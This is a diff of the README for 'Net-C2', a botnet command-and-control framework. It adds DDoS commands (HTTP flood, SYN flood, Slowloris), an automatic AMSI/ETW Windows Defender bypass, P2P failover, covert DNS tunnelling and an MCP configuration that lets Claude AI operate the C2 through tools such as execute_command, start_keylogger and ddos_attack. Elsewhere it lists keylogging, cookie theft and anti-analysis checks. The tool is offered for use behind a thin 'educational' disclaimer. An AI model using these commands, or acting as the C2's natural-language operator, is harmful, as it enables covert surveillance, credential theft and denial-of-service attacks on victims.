@@ -3,7 +3,7 @@
   <i>[Flexible and Powerful Botnet Tool]</i>
 </div>
 
-# Net-C2, My Biggest and Best Project
+# Net-C2, My Biggest
 
 > **This is for educational purposes only ⚠️** - Abuse of this project is prohibited. I am not responsible for this.
 
@@ -14,7 +14,7 @@
 
 ## 📋 Contents
 
-- [Features](#-features)
+- [Features v1.1.0](#-features-v110)
 - [Architecture](#️-architecture)
 - [Installation](#-installation)
 - [Usage](#-usage)
@@ -25,7 +25,19 @@
 - [FAQ](#-faq)
 - [License and Usage](#-license-and-usage)
 
-## 🚀 Features
+## 🚀 Features v1.1.0
+
+### 🛠 Fixs
+- **Better DDoS** DDoS has been **enhanced** and **new types** have been added.
+- **Better P2P** The P2P feature was **weak**. It has been **strengthened**.
+- **Better Bypass/Evesion Techniques** Evasion Techniques have been **updated**
+and a **Windows Defender Bypass** system has been added.
+- **More English** This project is currently entirely in **English**.
+- **Better DNS Tunnel** There was a logical **inconsistency** in the
+**DNS Tunnel** system. This has been **fixed**.
+
+### 🧠 AI-Powered Features
+- **Claude MCP** Now I can controll `Server.py` on **Claude AI**
 
 ### 🔐 Security and Encryption
 - **AES-256-CBC** encryption system
@@ -57,7 +69,7 @@
 - **Performance metrics**
 
 ### ⚔️ Attack Capabilities
-- **DDoS attacks** (UDP flood)
+- **DDoS attacks** (UDP flood And More...)
 - **Customizable parameters** (duration, threads)
 - **Educational use only**
 - **Safety limitations** built-in
@@ -67,7 +79,6 @@
 - **Real-time** bot status monitoring
 - **Interactive** command sending
 - **Security Alerts** display
-- **P2P Network** status
 - **Tor/Clearnet** bot separation
 - **Responsive** design
 - **Remote Terminal Control** system
@@ -88,6 +99,7 @@ Botnet/
 ├── Net.py                 # Bot Client
 ├── Kserver.py             # Keylogger Server (Separate)
 ├── web_dashboard.py       # Web Dashboard
+├── mcp_server.py          # For MCP Connections (New)
 ├── clipboard_data/        # Clipboard Data
 ├── cookies/               # Browser Cookies
 ├── downloads/             # Downloaded Files
@@ -118,16 +130,16 @@ graph TD
 # Python 3.8+ required
 python3 --version
 
-# Required packages
-pip install pycryptodome pynput flask requests stem psutil browser-cookie3 pillow
+# For Required packages
+pycryptodome, pynput, requests, dnslib...
 ```
 
 ### Quick Installation
 
 ```bash
 # Clone repository
-git clone https://github.com/yourusername/botnet-framework.git
-cd botnet-framework
+git clone https://github.com/zer0crypt02/Net-C2.git
+cd Net-C2
 
 # Install required packages
 pip install -r requirements.txt
@@ -146,6 +158,8 @@ psutil>=5.8.0
 browser-cookie3>=0.15.0
 dnslib>=0.9.0
 pillow>=8.0.0
+dnspython>=2.2.0
+mcp>=1.0.0
 ```
 
 ## 🎯 Usage
@@ -179,8 +193,8 @@ python3 Net.py
 
 **Environment Variables:**
 ```bash
-export C2_HOST=192.168.1.100
-export C2_PORT=8080
+export C2_HOST=HOST_ADDRESS
+export C2_PORT=PORT_NUMBER
 python3 Net.py
 ```
 
@@ -204,7 +218,7 @@ web start
 ### 🛡️ Anti-Analysis System
 
 ```python
-# Wireshark tespiti
+# Wireshark Detection System:
 if self.check_for_analysis_tools():
     print("[!] Analysis tool detected!")
     self.send_analysis_alert()
@@ -224,15 +238,6 @@ tor enable    # Enable Tor
 tor disable   # Disable Tor
 tor status    # Check Tor status
 tor bots      # List bots connected via Tor
-```
-
-### 🔍 DNS Tunneling
-
-```bash
-# DNS Tunneling commands
-dns_tunnel enable example.com    # Enable DNS tunneling
-dns_tunnel disable              # Disable DNS tunneling
-dns_tunnel status              # DNS tunneling status
 ```
 
 ## 🌐 Web Dashboard
@@ -257,25 +262,25 @@ dns_tunnel status              # DNS tunneling status
 ### 🔧 Basic Commands
 
 ```bash
-# Bot list
+# Bot List
 list
 
-# Bot information
+# Bot Information
 server
 
-# Send command
+# Send Command
 cmd <bot_id> <command>
 
-# Broadcast command
+# Broadcast Command
 broadcast <command>
 
-# Process list (with real CPU usage)
+# Process List (with real CPU usage)
 processes <bot_id>
 
-# System information
+# System Information
 sysinfo <bot_id>
 
-# VM check
+# VM Place Check
 isvm <bot_id>
 ```
 
@@ -288,16 +293,9 @@ upload <bot_id> <local_file> [remote_name]
 # File download
 download <bot_id> <remote_file> [local_path]
 
-# Screenshot (single)
-screenshot <bot_id>
-
 # Automatic screenshots (every 10 seconds)
 ss start <bot_id>
 ss stop <bot_id>
-
-# DDoS attacks 
-ddos start <bot_id> <target_ip> # Optional [--duration 30] [--threads 50]
-ddos stop <bot_id>
 ```
 
 ### 🔍 Data Collection
@@ -322,19 +320,6 @@ keylogger stop <bot_id>
 network_map start <bot_id> [scope]
 network_map status <bot_id>
 network_map stop <bot_id>
-```
-
-### 🔍 Security Commands
-
-```bash
-# Security status
-security
-
-# View alerts
-alerts
-
-# P2P status
-p2p status
 ```
 
 ### ❓ Help System
@@ -368,7 +353,7 @@ tor ?
 ╚══════════════════════════════════════════════════════════════════════════════╝
 
 [+] Server started on 0.0.0.0:8080
-[+] Keylogger server started on 192.168.237.191:8081
+[+] Keylogger server started on 192.168.x.xx:8081
 [+] New bot connected: Fatihs-MacBook-Pro.xxxxx (192.168.x.x)
 ```
 ![C2 Server](ScreenShots/Net5.png)
@@ -379,17 +364,6 @@ tor ?
 - Interactive command panel
 - Security alerts
 - P2P network status
-
-## 🔧 Advanced Features
-
-### 🔄 P2P Network
-
-```python
-# Start P2P network
-p2p_result = bot.start_p2p()
-print(f"P2P Port: {bot.p2p_port}")
-print(f"IPv6 Support: {bot.ipv6_enabled}")
-```
 
 ### 📊 Process Monitoring
 
@@ -406,7 +380,198 @@ system_info = bot.gather_system_info()
 vm_check = bot.check_vm_environment()
 ```
 
-## ❓ FAQ
+### 🛡️ Windows Defender Bypass (New)
+
+Auto-activates on Windows bots to bypass **AMSI** (Antimalware Scan Interface) real-time scanning.
+
+```python
+This feature will start as soon as the bot is activated.
+```
+
+**⚙ Features:**
+- **AMSI.dll** memory patching (AmsiScanBuffer)
+- ETW (Event Tracing) patching
+- Auto-activates on bot startup
+- **Windows-only** feature
+
+### ⚡ Renewed DDoS Methods
+
+Three attack types available:
+
+```bash
+# Layer 7 - HTTP/UDP Flood (default)
+ddos start <bot_id> <target_ip> [--duration 30] [--threads 50]
+
+# Layer 3 - SYN Flood (TCP handshake incomplete)
+ddos syn <bot_id> <target_ip> [--duration 30] [--threads 100]
+
+# Layer 7 - Slowloris (slow HTTP headers)
+ddos slowloris <bot_id> <target_ip> [--duration 60] [--connections 100]
+
+# Stop attack
+ddos stop <bot_id>
+```
+
+**Attack Methods:**
+| Method | Layer | Description |
+|--------|-------|-------------|
+| HTTP Flood | L7 | Rapid HTTP GET requests |
+| SYN Flood | L3/L4 | Incomplete TCP handshakes |
+| Slowloris | L7 | Slow partial HTTP headers |
+
+## ⚙ Advanced Features
+
+### 🔄 P2P Network (Updated)
+
+```python
+# Start P2P network
+p2p_result = bot.start_p2p()
+print(f"P2P Port: {bot.p2p_port}")
+print(f"IPv6 Support: {bot.ipv6_enabled}")
+```
+
+### 🔄 P2P Failover System:
+
+Automatic failover when C2 server disconnects.
+
+```python
+# P2P activates automatically after 5 seconds of C2 disconnection,
+# Bot retries C2 every 60 seconds,
+# Auto-switches back to C2 when available.
+```
+
+### 🔍 Peer Discovery:
+
+Automatic Peer Discovery when C2 server disconnects.
+
+```python
+# LAN broadcast (UDP port 55555),
+# Mesh peer discovery (Getting a list from other peers),
+# Heartbeat and Inactive peer cleanup.
+```
+
+**Behavior:**
+- C2-first with P2P fallback
+- Automatic mode switching
+- 60-second reconnection attempts
+- Seamless failover
+
+### 🧠 MCP Server Integration (New)
+
+Control the C2 server via Claude AI using Model Context Protocol (MCP).
+
+```bash
+mcp on -> Enable MCP
+
+# Now you can use natural language on Claude:
+# "List all Bots" | "Can you list connected Bots?" -> list
+# "Send [command] to Bot-123" | "Can you send whoami to Bot-123" -> cmd <Bot-123> <command>
+# "Start the Tor" | "Can you open the Tor Connections" -> tor enable
+
+# mcp off -> Disable MCP
+```
+
+**Available MCP Commands:**
+- `list_bots` - Show connected bots
+- `execute_command` - Run system commands
+- `start_keylogger` / `stop_keylogger`
+- `upload_file` / `download_file`
+- `ddos_attack` - Start/stop DDoS
+- `network_map` - Network scanning
+- `tor_status` - Tor service info
+- `dns_tunnel_enable` - Enable DNS tunneling with domain
+- And More...
+
+**Claude AI Connection Steps:**
+
+- Go to **Clude AI** Settings,
+- Next Click on the **Developer** section from the
+options on the side,
+- Then Press the **Edit Config** button,
+- `claude_desktop_config.json` Open the file and **edit**
+it as follows:
+
+```json
+{
+  "preferences": {
+    "sidebarMode": "chat",
+    "coworkScheduledTasksEnabled": false
+  },
+  "mcpServers": {
+    "c2-manager": {
+      "command": "/usr/local/bin/python3",
+      "args": ["The/Path/To/This/File/mcp_server.py"],
+      "env": {
+        "C2_SERVER_HOST": "HOST_ADDRESS",
+        "C2_SERVER_PORT": "PORT_NUMBER"
+      }
+    }
+  }
+}
+```
+- `"args": ["The/Path/To/This/File/mcp_server.py"],` This
+**should be** the path to the `mcp_server.py` file.
+
+
+### 🗺️ Network Mapping
+
+Scan and map local network from bot perspective.
+
+```bash
+# Start network scan
+network_map start <bot_id> 192.168.x.0/24
+
+# Check progress
+network_map status <bot_id>
+
+# View all maps
+network_maps
+```
+
+**Features:**
+- Multi-threaded scanning
+- Service detection
+- OS fingerprinting
+- CIDR notation support
+
+### 📡 DNS Tunneling (Updated)
+
+**Two-way covert communication** via DNS queries when all other channels are blocked.
+ 
+**⚙ Features:**
+- **Bidirectional**: Server can send commands to bots via DNS TXT responses
+- **Encrypted**: All data encrypted with AES-256 before Base64 encoding
+- **Chunked Transfer**: Large commands split into multiple DNS queries (200 char chunks)
+- **Command Polling**: Bots poll every 30 seconds for new commands
+- **Automatic Fallback**: Used as emergency channel when direct/P2P/Tor all fail
+
+```bash
+# Enable DNS Tunnel Server
+# Note: Requires root/admin privileges for port 53
+dns_tunnel enable c2domain.com
+
+# Check DNS Tunnel Status:
+dns_tunnel status
+```
+
+# Queue command for DNS tunnel bot (when bot only has DNS access)
+# The bot will receive this on its next DNS poll (every 30 seconds)
+
+**❓ How it works:**
+1. Bot sends **encrypted** data as subdomain: `base64data.c2domain.com`
+2. Server decodes, processes, and checks command queue for that bot
+3. Server sends response in **DNS** **TXT** record with any pending commands
+4. Bot polls periodically to check for new commands
+5. Large commands are chunked **across** multiple **TXT** records
+6. And This time there is **Two-Way** Communication.
+ 
+**⚠️ Requirements:**
+- `dnslib` library on server: `pip install dnslib`
+- `dnspython` library on bot: `pip install dnspython`
+- Port 53 access (may require root/admin)
+- Valid domain with NS records pointing to C2 serveratus
+
+### ❓ FAQ
 
 ### 🚀 Getting Started
 
@@ -428,9 +593,9 @@ go as planned, so I had to remove it. I don't know to how to add it. 🤔
 
 Follow these steps in order:
 1. `python3 Server.py` (Main C2 server)
-2. `python3 Kserver.py` (Optional - for keylogger)
+2. `python3 Kserver.py` (Optional - for Keylogger)
 3. `python3 Net.py` (Bot client)
-4. `web start` (Optional - Web dashboard)
+4. `web start` (Optional - For Web Dashboard)
 
 **How do I use environment variables for connection?**
 
@@ -463,19 +628,18 @@ Check these common issues:
 **How do I take screenshots from bots?**
 
 Use these commands:
-- `screenshot <bot_id>` - Single screenshot
 - `ss start <bot_id>` - Automatic screenshots every 10 seconds
 - `ss stop <bot_id>` - Stop automatic screenshots
 - Screenshots are saved to `ScreenS/` folder
 
-**How do I use DDoS attacks?**
+**How do I use DDoS attacks? And it was Renewed**
 
 ```bash
 # Basic DDoS attack (30 seconds, 50 threads)
-ddos start Bot-123 192.168.1.100
+ddos start Bot-123 192.168.x.xxx
 
 # Custom duration and threads
-ddos start Bot-123 192.168.1.100 --duration 60 --threads 25
+ddos start Bot-123 192.168.x.xxx --duration 60 --threads 25
 
 # Stop DDoS attack
 ddos stop Bot-123
@@ -483,6 +647,7 @@ ddos stop Bot-123
 - Max duration: 300 seconds
 - Max threads: 100
 - Attack type: UDP flood on port 80
+- Check the above ⬆️
 
 ### 🌐 Network & Security
 
@@ -510,7 +675,7 @@ Add `?` after any command:
 processes ?
 keylogger ?
 upload ?
-ss ?
+ddos ?
 ```
 
 ### ⚖️ Legal & Ethics
